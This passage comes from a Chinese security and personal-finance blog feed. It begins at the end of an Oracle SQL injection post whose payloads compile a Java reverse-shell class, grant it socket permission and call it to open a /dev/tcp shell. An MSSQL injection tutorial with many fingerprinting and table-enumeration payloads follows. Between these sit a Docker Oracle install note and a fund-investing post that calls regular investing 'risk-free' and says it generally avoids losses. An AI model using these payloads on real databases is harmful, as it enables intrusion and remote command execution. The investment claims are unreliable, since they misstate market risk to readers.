1&gt;&amp;9 2&gt;&amp;1;/bin/sh"</span>&#125;;</span><br><span class="line">                Process p=Runtime.getRuntime().exec(aaa);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line"><span class="keyword">javac </span><span class="keyword">shellRev.java</span></span><br><span class="line"><span class="keyword">#执行</span></span><br><span class="line"><span class="keyword">java </span><span class="keyword">shellRev</span></span><br></pre></td></tr></table></figure>

<h5 id="创建java代码-1"><a href="#创建java代码-1" class="headerlink" title="创建java代码"></a>创建java代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa=&#123;"/bin/bash","-c","exec 9&lt;&gt; /dev/tcp/127.0.0.1/8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/sh"&#125;;Process p=Runtime.getRuntime().exec(aaa);&#125;&#125;'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>#####赋予java权限</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''begin dbms_java.grant_permission( '''</span><span class="string">'''''PUBLIC'''</span><span class="string">''''', '''</span><span class="string">'''''SYS:java.net.SocketPermission'''</span><span class="string">''''', '''</span><span class="string">'''''&lt;&gt;'''</span><span class="string">''''', '''</span><span class="string">'''''*'''</span><span class="string">''''' );end;'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>#####创建函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''create or replace function reversetcp RETURN VARCHAR2 as language java name '''</span><span class="string">'''''shell.run() return String'''</span><span class="string">'''''; '''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>#####赋予函数执行权限</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''grant all on reversetcp to public'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>#####反弹shell</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select </span>sys.<span class="keyword">reversetcp </span>from dual</span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a href="https://redn3ck.github.io/2018/04/25/Oracle注入-命令执行-Shell反弹/" target="_blank" rel="noopener">https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/</a></p>
<p><a href="https://blog.csdn.net/weixin_38023368/article/details/76922153" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38023368/article/details/76922153</a></p>
<p><a href="https://www.cnblogs.com/pshell/articles/7473713.html" target="_blank" rel="noopener">https://www.cnblogs.com/pshell/articles/7473713.html</a></p>
]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>无风险套利之基金定投</title>
    <url>/2020/03/22/%E6%97%A0%E9%A3%8E%E9%99%A9%E5%A5%97%E5%88%A9%E4%B9%8B%E5%9F%BA%E9%87%91%E5%AE%9A%E6%8A%95/</url>
    <content><![CDATA[<p>今天抽个时间稍微讲下基金定投。平时很多人问我买什么基金或者买什么股票，我一般不荐股，但我推荐基金定投。由于我非常懒，能躺着就绝不坐着。但由于此时内外动荡，国内外股市大幅波动，已经到了不得不讲的时间点了。因此我就稍微来讲下基金定投的策略和一些可以长期持有的标的。本系列文章偏实战，理论分析较少，如需补充理论知识请自行补充。</p><a id="more"></a>
<h2 id="什么是基金定投"><a href="#什么是基金定投" class="headerlink" title="什么是基金定投"></a>什么是基金定投</h2><p>基金定投是定期定额投资基金的简称，是指在固定的时间（如每月8日）以固定的金额（如500元）投资到指定的开放式基金中，类似于银行的零存整取方式。人们平常所说的基金主要是指证券投资基金。（百度百科）</p>
<h2 id="基金定投优势"><a href="#基金定投优势" class="headerlink" title="基金定投优势"></a>基金定投优势</h2><h3 id="摊平不确定性"><a href="#摊平不确定性" class="headerlink" title="摊平不确定性"></a>摊平不确定性</h3><p>市场总是有很多不确定性和黑天鹅，如本次新冠肺炎导致刚要向上的上证指数在春节后大幅波动，也导致我有所亏损。但如果使用基金定投的方式，如每个月或者每周投入一定数量的金额，可以非常好得摊平风险和不确定性。</p>
<h4 id="基金定投会亏损吗？"><a href="#基金定投会亏损吗？" class="headerlink" title="基金定投会亏损吗？"></a>基金定投会亏损吗？</h4><p>只要选择比较靠谱的基金，长期定投，一般不会亏损。</p>
<p>以我刚闭着眼瞎J8选的比较有代表的沪深300指数类基金020011为例，以2015年6月12日牛市最高点接盘算起，每月定投1w，分的红利继续投，以下为1年，2年，3年的结果如下图所示。</p>
<p>第1年定投收益率为-7.95%，毕竟最高位当了接盘侠。</p>
<p><img src="//choge.top/2020/03/22/无风险套利之基金定投/dt-1.png" alt="dt-1"></p>
<p>第2年定投收益率为7.08%，还可以了。</p>
<p><img src="//choge.top/2020/03/22/无风险套利之基金定投/dt-2.png" alt="dt-2"></p>
<p>第3年收益率接近为10%</p>
<p><img src="//choge.top/2020/03/22/无风险套利之基金定投/dt-3.png" alt="dt-3"></p>
<p>以上是在最高位接盘情况下，且2015-2018年股市走的并非非常好，投入资金未做优化和分配的情况下的收益情况。只要选择比较靠谱的基金，长期定投，一般不会亏损。</p>
<h3 id="强制储蓄"><a href="#强制储蓄" class="headerlink" title="强制储蓄"></a>强制储蓄</h3><p>如果你是每个月月光，而且又不知道钱花在了哪里，可使用基金定投的方式来做强制储蓄，既能储蓄，又能赚钱，一举两得。</p>
<h3 id="懒人投资，躺赢"><a href="#懒人投资，躺赢" class="headerlink" title="懒人投资，躺赢"></a>懒人投资，躺赢</h3><p>适合上班族，设置好定投策略就不用再管了，而且可以躺赢80%的证券投资者。</p>
<h2 id="基金定投劣势"><a href="#基金定投劣势" class="headerlink" title="基金定投劣势"></a>基金定投劣势</h2><p>牛市来了收益不及买股票收益，此点劣势可以忽略不计，因为牛市到最后，大部分韭菜可能比熊市亏得更多😭😭😭。</p>
<h2 id="如何购买"><a href="#如何购买" class="headerlink" title="如何购买"></a>如何购买</h2><h3 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h3><p>支付宝-搜索栏-基金-输入基金代码-直接买入或设置每月或者每周购买策略</p>
<h3 id="证券账户"><a href="#证券账户" class="headerlink" title="证券账户"></a>证券账户</h3><p>搜索栏-基金-输入基金代码-直接买入或设置每月或者每周购买策略</p>
<h3 id="其他渠道"><a href="#其他渠道" class="headerlink" title="其他渠道"></a>其他渠道</h3><p>比较靠谱的渠道有天天基金网/app、蛋卷基金、微信、同花顺、且慢、网上银行等，此类渠道如何和购买未研究，自己研究，大同小异。</p>
<h2 id="场内场外基金"><a href="#场内场外基金" class="headerlink" title="场内场外基金"></a>场内场外基金</h2><h3 id="场外基金"><a href="#场外基金" class="headerlink" title="场外基金"></a>场外基金</h3><p>场外基金就是直接从基金公司手里买。基金公司发行基金后，我们可以向基金公司买入（申购）/卖出（赎回）。支付宝等够买场外基金时即为与各类基金公司建立购买渠道，就能通过支付宝购买，但不同基金公司策略不同，有部分基金会对支付宝进行购买限制，如暂停购买或者限额购买，限制买入或者限制卖出等。在某一平台碰到限制情况下可以看看其他平台或者直接在证券账户够买。</p>
<p>场外基金主要为开放式基金包括LOF和部分ETF基金，净值每天变动</p>
<h3 id="场内基金"><a href="#场内基金" class="headerlink" title="场内基金"></a>场内基金</h3><p>场内外基金这个场，指的就是证券公司，开了证券账户不仅能购买场外基金，还能购买场内基金。场内基金主要为证券公司购买，本质上就是一些实时交易的股票组合，净值每10秒变动一次，交易操作也类似与股票有10%涨跌幅限制。</p>
<p>场内基金主要包括，LOFT基金、ETF基金、封闭式基金</p>
<h2 id="被动主动基金"><a href="#被动主动基金" class="headerlink" title="被动主动基金"></a>被动主动基金</h2><h3 id="被动基金"><a href="#被动基金" class="headerlink" title="被动基金"></a>被动基金</h3><p>被动型基金（通常被称为指数型基金）一般选取特定的指数成份股作为投资的对象，不主动寻求超越市场的表现，而是试图复制指数的表现，例如沪深300指数、创业板指数，还有行业指数等等。本文主要讲指数基金为主。</p>
<h3 id="主动基金"><a href="#主动基金" class="headerlink" title="主动基金"></a>主动基金</h3><p>主动型基金是是基金经理主动管理这只基金，选择投资策略和进出股票市场的时间。</p>
<h3 id="指数增强型基金"><a href="#指数增强型基金" class="headerlink" title="指数增强型基金"></a>指数增强型基金</h3><p>指数增强型基金并非纯指数基金，是指基金在进行指数化投资的过程中，为试图获得超越指数的投资回报，在被动跟踪指数的基础上，加入增强型的积极投资手段，对投资组合进行适当调整，力求在控制风险的同时获取积极的市场收益。 指数增强型基金将大部分资产按照基准指数权重配置之外，对成份股进行一定程度的增、减持，或增持成份股以外的个股，其投资目标则是在紧密跟踪基准指数的同时获得高于基准的收益。（百度百科）</p>
<h2 id="购买策略"><a href="#购买策略" class="headerlink" title="购买策略"></a>购买策略</h2><p>此部分基金不区分场内外，如果发现有部分基金支付宝无法购买可能需要更换购买渠道或者使用证券账户场内购买。但场外基金更适合基金定投，场内基金更适合做单次配置或类似于股票一样的交易买卖。下面列举的大部分基金为场外基金，小部分场内基金。</p>
<h3 id="优质基金"><a href="#优质基金" class="headerlink" title="优质基金"></a>优质基金</h3><p>1.代码：513600 南方恒指ETF 特点：优质港股，腾讯，中移动，港股建设银行，港股中国平安等</p>
<p>2.代码：164705 汇添富恒生指数分级（QDII）特点：优质港股，腾讯等</p>
<p>3.代码：110031 易方达恒生中国企业ETF联接（QDII） 特点：优质港股，腾讯，中移动，港股建设银行，港股中国人寿等</p>
<p>4.代码：512880 国泰中证全指证券 特点：与证券相关基金</p>
<p>5.代码：160225 国泰国证新能源汽车指数 特点：与新能源相关基金</p>
<p>6.代码：161028 国富中证新能源汽车指数分级基金 特点：与新能源相关基金</p>
<p>7.代码：515050 华夏中证5G通信主题ETF  特点：5g相关</p>
<p>8.代码：515070 华夏中证人工智能主题ETF 特点：跟踪人工智能股票</p>
<p>9.代码：000478 建信中证500指数增强A 特点：跟踪中证500成分股</p>
<p>10.代码：001244 华泰柏瑞量化智慧灵活配置混合A 特点：A股优质股票，跟踪中证500</p>
<p>11.代码：000172 华泰柏瑞量化增强混合A 特点：A股优质股票，跟踪沪深300</p>
<p>12.代码：540012  汇丰晋信恒生A股行业龙头A  特点：贵州茅台，中国平安等优质股，此基金是恒生公司的执行的A股各行业龙头，并非为港股基金</p>
<p>13.代码：513050 中概互联 特点：顾名思义包含了一篮子在国外上市的优质互联网公司，如腾讯、阿里、京东、网易等互联网公司</p>
<p>14.代码：159915 易方达创业板ETF  特点：跟踪创业板指数</p>
<p>15.代码：160420 华安创业板50指数分级  特点：创业板优质股票</p>
<p>16.代码：162411 华宝油气A  特点：优质资产，但现在不推荐，做个记录</p>
<p>17.代码：006947 华宝中短债A  特点：稳得一比，妥妥跑赢银行理财</p>
<h3 id="购买策略-1"><a href="#购买策略-1" class="headerlink" title="购买策略"></a>购买策略</h3><h4 id="港股指数配置"><a href="#港股指数配置" class="headerlink" title="港股指数配置"></a>港股指数配置</h4><p>现港股估值到了人类历史最低，人类历史最低，人类历史最低，重要的事情说三遍，所以1-3中和港股指数相关标的必须配置其一，现南下资金也在抄底港股，我也觉得此时定投性价比极高。</p>
<h4 id="牛市预期配置"><a href="#牛市预期配置" class="headerlink" title="牛市预期配置"></a>牛市预期配置</h4><p>牛市必定回来，疫情过去，全面复苏之后中国资产或是世界最好的资产，4必须配置，同时牛市以来中证500的弹性极大，所以9-10选其一。当然中证500可以换成沪深300，也就是选择11，这样风险更低。</p>
<h4 id="行业配置"><a href="#行业配置" class="headerlink" title="行业配置"></a>行业配置</h4><p>管理层定性房住不炒，经济刺激点为新能源汽车和5g以及5g之后的人工智能、物联网的发展。所以5-6任选其一，7-8任选其一即可</p>
<h4 id="优质资产"><a href="#优质资产" class="headerlink" title="优质资产"></a>优质资产</h4><p>优质资产可以选择国内的龙头公司12或者选择国外上市的优质互联网公司13。</p>
<h4 id="仓位分配"><a href="#仓位分配" class="headerlink" title="仓位分配"></a>仓位分配</h4><p>我的风险偏好比较高，对牛市期待较大，看好5g新基建发展。所以我会在港股指数配置选择编号3的110031，牛市预期配置选择编号4的512880，行业配置我新能源和5g都选，即选择编号5和编号7的160225 和515050，同时选择一些优质资产，个人比较喜欢互联网公司所以选择编号13的513050。</p>
<p>由于个人风险偏好较高，所以配置110031:512880:160225:515050:513050的比例为2:3:2:2:1。</p>
<p>以上只是为一种配置思路，可以结合自身的情况和风险偏好，在我选出的基金中做适当调整和配置，也可以使用编号为14-17的基金做适当调整。</p>
<h3 id="如何定投"><a href="#如何定投" class="headerlink" title="如何定投"></a>如何定投</h3><p>定投时间两年以上为佳，以30万人民币，定投30个月为例。只需要要将资产分成30等份，每份1w。没1w中110031:512880:160225:515050:513050的比例为2:3:2:1:2。</p>
<h4 id="定投优化"><a href="#定投优化" class="headerlink" title="定投优化"></a>定投优化</h4><p>定投优化类似指数增强，就是对择机和择做出适当调整，如现在这个节点可以将每份定投资金设置为3000，进行少量建仓，同时建仓港股指数基金为主。当疫情到达最高峰时可以适当调整为每周定投，每周定投每份资金加到1w。总之，根据不同时间点适当人为干预，目的是获得更高的收益。当然也可以无脑按照固定比例定投，只需要选择好时间点即可，如全球经济恶化到无法再恶化之时即为出手时机。</p>
<p>那么有没有工具自动帮我优化策略无脑投资呢？</p>
<p>这个也有，就是上面讲到过有个且慢app，这个公司我研究过还是靠谱的，里面有个长赢计划，长赢计划买入了一篮子基金，当其中一个基金估值高了就踢出去，重新纳入新的低估基金，保证有更高的收益。（本人未投长赢计划，如果你比我还懒，一个月都不想看一次，那就投长赢吧。）</p>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>我炒股也有些年头了，风险偏好较大。选的股基行情好暴涨大赚，有点风吹草动就暴跌利润亏完。来来回回过山车，也没赚几块钱，后面可能会逐渐考虑极大基金配置同时减少股票配置，可能会获得更好的收益。</p>
<p>定投的基金一段时间也需要卖出，或者换低估的基金。但我觉得现在开始到未来一年都是比较好的配置时间，关于什么时间点卖出和卖出策略后面再写。</p>
<p>野生非专业基金经理意淫到此结束，仅供参考。</p>
]]></content>
      <categories>
        <category>无风险套利</category>
      </categories>
      <tags>
        <tag>基金定投</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次docker安装oracle_11g</title>
    <url>/2020/03/22/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E5%AE%89%E8%A3%85oracle-11g/</url>
    <content><![CDATA[<p>记录一次安装oracle_11g过程</p><p>使用镜像registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g</p><p>系统用户：root   密码：helowin</p><p>数据库用户：oracle</p><p>数据库路径：/home/oracle/app/oracle</p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g</span><br></pre></td></tr></table></figure><a id="more"></a>






<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><p>运行镜像并把端口映射到本机1521</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 1521:1521 --name oracle registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g</span><br></pre></td></tr></table></figure>

<h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it oracle bash</span><br></pre></td></tr></table></figure>

<h3 id="切换为root用户"><a href="#切换为root用户" class="headerlink" title="切换为root用户"></a>切换为root用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su root  #密码为helowin</span><br></pre></td></tr></table></figure>

<h3 id="编辑环境变量"><a href="#编辑环境变量" class="headerlink" title="编辑环境变量"></a>编辑环境变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi /etc/profile</span><br></pre></td></tr></table></figure>

<p>末尾添加内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export ORACLE_HOME=/home/oracle/app/oracle/product/11.2.0/dbhome_2</span><br><span class="line">export ORACLE_SID=helowin</span><br><span class="line">export PATH=$ORACLE_HOME/bin:$PATH</span><br></pre></td></tr></table></figure>

<p>配置生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="切换为oracle用户"><a href="#切换为oracle用户" class="headerlink" title="切换为oracle用户"></a>切换为oracle用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su oracle</span><br></pre></td></tr></table></figure>

<h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlplus /nolog</span><br><span class="line">conn /as sysdba</span><br></pre></td></tr></table></figure>

<h3 id="修改-sys-和-system-的密码并且修改密码的有效时间为无限"><a href="#修改-sys-和-system-的密码并且修改密码的有效时间为无限" class="headerlink" title="修改 sys 和 system 的密码并且修改密码的有效时间为无限"></a>修改 sys 和 system 的密码并且修改密码的有效时间为无限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter user system identified by oracle;</span><br><span class="line">alter user sys identified by oracle;</span><br><span class="line">alter profile default limit password_left_time unlimted;</span><br></pre></td></tr></table></figure>

<h3 id="使用navicat连接"><a href="#使用navicat连接" class="headerlink" title="使用navicat连接"></a>使用navicat连接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip：本机ip</span><br><span class="line">端口：1521</span><br><span class="line">SID：helowin</span><br><span class="line">账号：system</span><br><span class="line">密码：oracle</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>MsSQL注入</title>
    <url>/2020/03/19/MsSQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>本文主要整理MSSQL注入，使用Ph0rse环境</p><h2 id="MSSQL安装"><a href="#MSSQL安装" class="headerlink" title="MSSQL安装"></a>MSSQL安装</h2><h3 id="MSSQL安装-1"><a href="#MSSQL安装-1" class="headerlink" title="MSSQL安装"></a>MSSQL安装</h3><p>选择默认实例</p><p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-1.png" alt="mssql-1"></p><p>选择混合模式并输入密码</p><p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-1.png" alt="mssql-1"></p><h3 id="MSSQL身份验证方式"><a href="#MSSQL身份验证方式" class="headerlink" title="MSSQL身份验证方式"></a>MSSQL身份验证方式</h3><h3 id="MSSQL自带数据库"><a href="#MSSQL自带数据库" class="headerlink" title="MSSQL自带数据库"></a>MSSQL自带数据库</h3><p>MSSQL自带四个系统库，分别存储一些特殊信息，对于前期注入而言，尤其要掌握tempdb</p><p>tempdb数据库是一个非常特殊的数据库，供所有来访问你的MSSQL的用户使用。这个库用来保存所有的临时表、存储过程和其他MSSQL建立的临时用的东西。例如，排序时要用到tempdb数据库。数据库放进tempdb数据库，排序完后再把结果返回给用户。每次MSSQL重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永远保存的表。</p><a id="more"></a>






<h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><h3 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h3><h4 id="初步判断是否为mssql"><a href="#初步判断是否为mssql" class="headerlink" title="初步判断是否为mssql"></a>初步判断是否为mssql</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> user&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h4 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">and</span> (<span class="built_in">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span>   <span class="meta"># mssql</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">and</span> (<span class="built_in">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> mysysobjects)&gt;<span class="number">0</span>   <span class="meta"># access</span></span><br></pre></td></tr></table></figure>

<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">@@<span class="built_in">version</span> <span class="comment">#查看版本</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="comment">@@</span>version--</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-4.png" alt="mssql-4"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> @@<span class="keyword">version</span> <span class="keyword">like</span> <span class="string">'%14%'</span> ;  <span class="comment">#探测版本，版本正确，执行成功</span></span><br></pre></td></tr></table></figure>

<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Ph0rse1' <span class="keyword">and</span> @@<span class="built_in">version</span> like '%<span class="number">14</span>%'  <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-5.png" alt="mssql-5"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Ph0rse1' <span class="keyword">and</span> @@<span class="built_in">version</span> like '%<span class="number">15</span>%'  <span class="comment">--+  #版本错误执行未成功</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-6.png" alt="mssql-6"></p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> <span class="built_in">name</span>,loginame <span class="keyword">from</span> master..syslogins,master..sysprocesses    <span class="meta">#syslogins存储登陆信息   sysprocesses存储进程信息</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-7.png" alt="mssql-7"></p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">user</span>, <span class="selector-tag">system_user</span>, <span class="selector-tag">suser_sname</span>(), <span class="selector-tag">is_srvrolemember</span>(<span class="string">'sysadmin'</span>)，<span class="selector-tag">is_srvrolemember</span>(<span class="string">'public'</span>)</span><br><span class="line">#查看权限<span class="selector-tag">null</span>表示非<span class="selector-tag">sysadmin</span>权限</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-8.png" alt="mssql-8"></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">@<span class="symbol">@servername</span>  <span class="meta">#查看服务器名字</span></span><br></pre></td></tr></table></figure>

<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">and</span> ((<span class="built_in">select</span> <span class="built_in">host_name</span>())=(<span class="built_in">select</span> <span class="comment">@@</span>servername))--  </span><br><span class="line">判断是否站库分离，报错，则站库分离，回显正常，则无站库分离</span><br><span class="line"><span class="comment">@@</span>servername代表服务名字 web端</span><br><span class="line">host_name代表web应用主机系统名字 数据库端</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases   <span class="comment">#查询数据库名字</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-10.png" alt="mssql-10"></p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">select DB_NAME(<span class="built_in">i</span>) 查询数据库名字 <span class="built_in">i</span>代表第几个数据库</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-11.png" alt="mssql-11"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_helpdb master;   <span class="comment">#定位数据库文件 location of master.mdf</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-20.png" alt="mssql-20"></p>
<h3 id="暴数据表"><a href="#暴数据表" class="headerlink" title="暴数据表"></a>暴数据表</h3><p>sysobject是一个系统视图，用于存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，而XTYPE代表对象的类型。</p>
<p>U 表（用户定义类型）</p>
<p>V  视图</p>
<p>P  存储过程</p>
<p>X  扩展存储过程</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> name <span class="keyword">from</span> master..sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-12.png" alt="mssql-12"></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substring(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables &gt; <span class="comment">'A'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight q"><table><tr><td class="code"><pre><span class="line"><span class="built_in">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight q"><table><tr><td class="code"><pre><span class="line"><span class="built_in">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_name <span class="built_in">not</span> in (<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span>))</span><br></pre></td></tr></table></figure>

<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> master..syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> master..syscolumns <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'tablename'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substring(column_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.columns &gt; <span class="comment">'A'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="built_in">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns)</span><br></pre></td></tr></table></figure>

